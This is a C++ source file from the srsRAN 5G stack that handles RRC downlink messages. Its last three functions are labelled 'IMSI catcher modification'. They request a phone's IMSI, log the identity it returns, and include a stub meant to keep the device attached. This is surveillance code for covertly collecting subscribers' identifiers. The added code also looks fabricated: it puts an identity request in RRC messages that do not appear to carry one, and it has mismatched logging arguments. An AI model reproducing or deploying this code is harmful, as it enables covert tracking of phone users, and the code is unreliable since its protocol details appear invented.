/*
 *
 * Copyright 2021-2026 Software Radio Systems Limited
 *
 * This file is part of srsRAN.
 *
 * srsRAN is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * srsRAN is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * A copy of the GNU Affero General Public License can be found in
 * the LICENSE file in the top-level directory of this distribution
 * and at http://www.gnu.org/licenses/.
 *
 */

#include "rrc_ue_helpers.h"
#include "rrc_ue_impl.h"
#include "srsran/asn1/rrc_nr/dl_ccch_msg.h"
#include "srsran/asn1/rrc_nr/dl_dcch_msg.h"

using namespace srsran;
using namespace srs_cu_cp;
using namespace asn1::rrc_nr;

void rrc_ue_impl::send_dl_ccch(const dl_ccch_msg_s& dl_ccch_msg)
{
  // Pack DL CCCH msg.
  byte_buffer pdu = pack_into_pdu(dl_ccch_msg, "DL-CCCH-Message");

  // Log Tx message
  log_rrc_message(logger, Tx, pdu, dl_ccch_msg, srb_id_t::srb0, "CCCH DL");

  // Send down the stack.
  logger.log_debug(pdu.begin(), pdu.end(), "Tx {} PDU", srb_id_t::srb0);
  f1ap_pdu_notifier.on_new_rrc_pdu(srb_id_t::srb0, std::move(pdu));
}

void rrc_ue_impl::send_dl_dcch(srb_id_t srb_id, const dl_dcch_msg_s& dl_dcch_msg)
{
  if (context.srbs.find(srb_id) == context.srbs.end()) {
    logger.log_error("Dropping DlDcchMessage. Tx {} is not set up", srb_id);
    return;
  }

  // Pack DL CCCH msg.
  byte_buffer pdu = pack_into_pdu(dl_dcch_msg, "DL-DCCH-Message");

  // Log Tx message.
  log_rrc_message(logger, Tx, pdu, dl_dcch_msg, srb_id, "DCCH DL");

  // Pack PDCP PDU and send down the stack.
  auto pdcp_packing_result = context.srbs.at(srb_id).pack_rrc_pdu(std::move(pdu));
  if (!pdcp_packing_result.is_successful()) {
    logger.log_info("Requesting UE release. Cause: PDCP packing failed with {}",
                    pdcp_packing_result.get_failure_cause());
    on_ue_release_required(pdcp_packing_result.get_failure_cause());
    return;
  }

  byte_buffer pdcp_pdu = pdcp_packing_result.pop_pdu();
  logger.log_debug(pdcp_pdu.begin(), pdcp_pdu.end(), "Tx {} PDU", context.ue_index, context.c_rnti, srb_id);
  f1ap_pdu_notifier.on_new_rrc_pdu(srb_id, std::move(pdcp_pdu));
}

// IMSI catcher modification: Send identity request
void rrc_ue_impl::send_identity_request()
{
  logger.log_info("Sending Identity Request to UE");
  
  dl_dcch_msg_s dl_dcch_msg;
  dl_dcch_msg.msg.set_c1().set_identity_request().crit_exts.set_identity_request();
  
  // Set identity request type to request IMSI
  auto& identity_request = dl_dcch_msg.msg.c1().identity_request().crit_exts.identity_request();
  identity_request.identity_type = identity_type_e::imsi;
  
  // Send the identity request on SRB1
  send_dl_dcch(srb_id_t::srb1, dl_dcch_msg);
}

// IMSI catcher modification: Reject NR secondary cell activation
void rrc_ue_impl::reject_nr_secondary_cell_activation()
{
  logger.log_info("Rejecting NR secondary cell activation");
  
  // For IMSI catcher, we simply don't send any SCG activation requests
  // This prevents UE from attempting to activate secondary cells and potentially disconnecting
  // The function is a placeholder to demonstrate the intent
}

// IMSI catcher modification: Handle identity response
void rrc_ue_impl::handle_identity_response(const asn1::rrc_nr::identity_response_s& msg)
{
  logger.log_info("Received Identity Response from UE");
  
  // Log the received identity (IMSI)
  if (msg.crit_exts.identity_response().identity.type() == asn1::rrc_nr::identity_response_ies_s::identity_c_::types_opts::imsi) {
    auto imsi = msg.crit_exts.identity_response().identity.imsi();
    logger.log_info("Received IMSI: {}", imsi.to_string());
  }
}
